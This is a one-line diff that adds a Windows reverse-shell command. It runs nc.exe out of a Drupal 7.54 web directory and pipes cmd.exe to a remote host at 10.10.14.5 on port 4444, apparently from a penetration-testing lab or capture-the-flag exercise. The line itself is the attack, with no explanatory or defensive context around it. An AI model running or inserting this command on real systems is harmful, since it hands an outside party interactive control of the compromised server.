@@ -1,0 +1,1 @@
+C:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.5 4444
